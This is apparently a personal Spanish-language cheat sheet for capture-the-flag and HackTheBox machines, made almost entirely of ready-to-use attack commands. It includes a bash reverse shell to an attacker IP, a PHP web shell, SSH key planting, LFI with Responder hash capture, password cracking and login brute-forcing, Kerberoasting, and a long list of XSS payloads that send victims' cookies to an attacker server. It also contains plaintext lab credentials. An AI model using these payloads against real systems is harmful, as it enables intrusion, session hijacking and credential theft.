# CtfCheatsheet


### BASICS
```
CAT en windows es TYPE
WGET en windows es WGET nombredelarchivooriginal -OUTFILE nombrequequieras
```
### NMAP
```
nmap *10.129.196.97 -p 1-65535 -T4 -A -v   //// -T4(limite de tiempo) -A ( agresivo inclue -sV ( versiones) -sC (scripts) -O (-o sistema operativo)) -v (muestre mas cosas en consolas)

nmap -sS -sU -T4 -A -v 10.10.10.3 (puertos udp)

```
### REVERSE SHELL
```

!/bin/bash ---> otra shell por ejemplo cuando estamos dentro de un programa que utiliza less( igual que el vim/nano
solo que no se puede escribir) ejecutamos !/bin/bash y nos saca fuera como si fueramos root
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
cuando no funciona un comando se prueba poniendo bash -c "comando" en este caso ->> bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"

REVERSE SHELL MAS POTENTE (Se ejecuta una vez que están dentro de una reverse Shell) ->

python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")

```
### MYSQL
```
mysql -h IP -u root
Dentro de la revershell lanzamos mysql -u user -pPASSWD (sin espacio detras de la p)
show databases;
por ejemplo tenemos la databases de joomla ---> use joomla
show tables;
select * FROM users \G (por ejemplo la que encontramos es user)

```
### FTP
```
ftp <IP>
>anonymous
>anonymous
>ls -a # List all files (even hidden) (yes, they could be hidden)
>binary #Set transmission to binary instead of ascii
>ascii #Set transmission to ascii instead of binary
>bye #exit
wget -m ftp://anonymous:anonymous@10.10.10.98 #Donwload all
Tambien se puede descargar desde dentro de ftp con get filename
```
### FFUF
```
		-MC --> acepta cualquier codigo
		-fs 0 ----> filtra tamaño 0
		-status 404 --> no hay nada
		-status 200 ---> buscamos este
		-status 301 ---> comun como el 404

ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.sh,.txt,.aspx -u http://10.10.11.175:8530/FUZZ -mc all -ic  ----->> lista directorios que hay en la pagina
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb" -fs
ffuf -w /usr/share/seclists/Fuzzing/special-chars.txt -u http://10.10.10.70/submit -d "character=bart&quote=FUZZ" -H Content-Type:application/x-www-form-urlencoded -mc all
ffuf -w /usr/share/seclists\Usernames\xato-net-10-million-usernames.txt -u http://10.10.11.160:5000/login -d "username=FUZZ&password=nidecoña" -H Content-Type:application/x-www-form-urlencoded -mr 'Invalid login'
  -fs es para excluir sites que se repitan
```
### BRUTE FORCE
```
``
##JOHN THE RIPPER
 ``

.\john.exe .\hashes.txt --mask=susan_nasus_?d?d?d?d?d?d?d?d?d --format=Raw-SHA256  --> --mask= si sabes algo en concreto de la password, en este caso sabes que empieza por susan_nasus y va del 1 al 1.000.000.000 de hay que sea ?d?d?d?d?d?d?d?d?d --format= añades el formato del hash esto lo buscas en -> https://hashcat.net/wiki/doku.php?id=example_hashes

--mask -> son 9 numeros por lo tanto es d y una ? delante por cada d
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff
 ``
 ## HASHCAT
 ``

hashcat -a 3 -m 18200  abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f "susan_nasus_?d?d?d?d?d?d?d?d?d"
-m 1400 = porque el hash es tipo Raw-SHA256, sacas que es 1400 de aqui https://hashcat.net/wiki/doku.php?id=example_hashes

-a 3 = siempre a menos que quieras meter una rule que seria= -a 0

hashcat -a 3 -m 18200 hashes.txt rockyou.txt
```
### SSH-SCP
```
 ``
 ##SSH
 ``
conectar por SSH ---> user@IP ---> te pide la pass luego
ssh-keygen -f "user"  ---> crea tu key(llave) ssh-keygen -f "peterolord"
echo "public key" > /home/susan/.ssh/authorized_keys  ---> mete tu keyn en el fichero del servidor authorizedkey para poder utilizarlo 
ssh -i  peterolord(nombre llave) susan@10.10.11.253   ---> conecta tu maquina con el servidor mediante ssh, si tuvieras la contraseña de susan seria ->>
ssh -i susan susan@10.10.11.253 --> teniendo la key de susan 
	nombrekey  user@IPMaquina	
 ``
 ##SCP
 ``
subir ficheros --> scp -i peterolord ./Downloads/linpeas.sh  susan@10.10.11.253:/tmp  --> (peterolord=mi key) /user@IP/direccion donde quieres subir el archivo 
bajar ficheros --> scp -i peterolord susan@10.11.253.10:/rutadelficheroadescargar ./rutadondequieresdescargarlo	
TENIENDO CONTRASEÑA ---> no se pone -i peterolord --->scp ./Downloads/linpeas.sh  susan@10.10.11.253:/tmp
Una vez que ya tienes el linpeas dentro de la maquina victima te vas a /tmp y haces BASH linpeash.sh
Si es winpeas lo corres poniendo el nombre solo

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGcUHHKDpEXK5XbpXBFIoJ6Duq+2c1Y9gfoLn+BK+RhR = USER KEY
```
### PHP SHELL
```

Si es un .php con html solo pones : <?php echo "Shell":system($_REQUEST['cmd']); ?>
Si tiene un <?php al principio pones solo: echo "Shell":system($_REQUEST['cmd']);
$_REQUEST --> admite tanto POST como GET
Si viene escrito shell en algun lado es que ha funcionado.

Al ver que funciona ya metes la shell de PHP ( ver PHP SHELL)
Si por ejemplo has introducido el codigo php en una pagina que se llama index.php, buscas ---> dev.devvortex.htb/index.php?cmd=id
te lo llevas al burpsuite y ya hay desde el repeater vas buscando con ls, etc

```
### IMPACKET
```

impacket-GetNPUsers.py active.htb/ -dc-ip 10.10.10.100 -request ---> kerberoasting, tienes una lista de usuarios y sacas la contraseña

```
### BLOODHOUND
```

1) activas el neo4j -> 
 - cd /usr/bin
 -./neo4j console
2) desde donde tienes el bloodhound en este caso Downloads/Bloodhound tiras -> ./BloodHound --no-sandbox
3) te abrira el bloodhound, acc: neo4j y pass: rvb07996

bloodhound-python -d jab.htb -c all -u svc_openfire -p '!@#$%^&*(1qazxsw' -ns 10.10.11.4 --zip ---> te devuelve un archivo zip que lueg
lo metes en el bloodhound, lo analiza y te dice que pasos seguir para escalar privilegios


bloodhound-python -d jab.htb -c all -u svc_openfire -p '!@#$%^&*(1qazxsw' -ns 10.10.11.4 --zip

139/445 ---> SMB (COMPARTIR CARPETA)
	crackmapexec smb 10.129.71.181 -u '' -p '' --shares (shares = cualquier carpeta) 
	lista carpetas que hay compartidas con login null
	crackmapexec smb 10.129.71.181 -u 'anonymous' -p '' --shares
	loggin con usuario
	smbclient --no-pass //IP/Folder   (se conecta a la carpeta)
	smbclient -L -> lista carpetas compartidas
```
### EVIL-WINRM 
```

evil-winrm -i 10.129.136.91 -u administrator -p badminton

```
### NTLM
```

NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response
authentication protocol used to authenticate a client to a resource on an Active Directory domain.
It is a type of single sign-on (SSO) because it allows the user to provide the underlying authentication factor
only once, at login.
The NTLM authentication process is done in the following way :
1. The client sends the user name and domain name to the server.
2. The server generates a random character string, referred to as the challenge.
3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the
server.
4. The server retrieves the user password (or equivalent).
5. The server uses the hash value retrieved from the security account database to encrypt the challenge
string. The value is then compared to the value received from the client. If the values match, the client
is authenticated.

```
### LFI ---> Local File Inclusion
``` 

Por ejemplo en la maquina responder htb tenemos la pagina http://unika.htb/index.php?page=french.html que puede ser vulnerable a LFI
si no esta bien configurada
En un sistema windows vamos a probar si funciona e incluye files en el sistema con la ruta de /system32 que siempre existe
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
Una vez que sabemos que es vulnerable siendo windows podemos seleccionar un protocolo como SMB, windows intentara autenticarse
en nuestra maquina y nosotros capturaremos el NetNTLMv2 (New Technology Lan Manager) con la herramienta RESPONDER
```
### RESPONDER ---> (capturar NTLM entre otros)
```

Lo inicializamos --> sudo responder -I {network_interface} se ve con ifconfig
Ahora le decimos al server que incluya un recurso de nuestro SMB server con -Z http://unika.htb/?page=//10.10.14.25/somefile
con la ip de nuestra maquina atacante ( dara un error en la web pero en el responder tendremos  NetNTLMv del administrator)
```
### XSS
```

Robar cookies de admin ---> probar en el burpsuite con un payload con estos script, suele funcionar el siguiente ->>
<script>var i=new Image();i.src="http://10.10.14.3/?c="+document.cookie</script>

PREVIAMENTE: -> Se abre un servidor http por el puerto 80 por el que se recibirá la cookie del administrador, con esta cookie la cambiamos 
o bien dentro del burp suite o bien en el navegador -> (navegador) -> click derecho en el buscador, seleccionamos inspect element -> storage tab -> modificamos la cookie que hemos robado

<img src=x onerror=this.src="http://10.10.14.3/?c="+document.cookie>
<img src=x onerror="location.href='http://10.10.14.3/?c='+ document.cookie">
<script>new Image().src="http://10.10.14.3/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://10.10.14.3/?c="+escape(document.cookie);</script>
<script>location.href = 'http://10.10.14.3/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://10.10.14.3/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://10.10.14.3/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://10.10.14.3/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://10.10.14.3/?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://10.10.14.3/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://10.10.14.3/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://10.10.14.3/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://10.10.14.3/?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://10.10.14.3/?c="+document.cookie</script>
<script>window.location="https://10.10.14.3/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://10.10.14.3/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://your-subdomain-here.burpcollaborator.net/', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>

```
### ZONE TRASNFER(tcp 53)
```
 Linux ->
dig axfr @"ip" dns
Windows -> 
nslookup
  server "ip"
  ls -d ctfolympus.htb

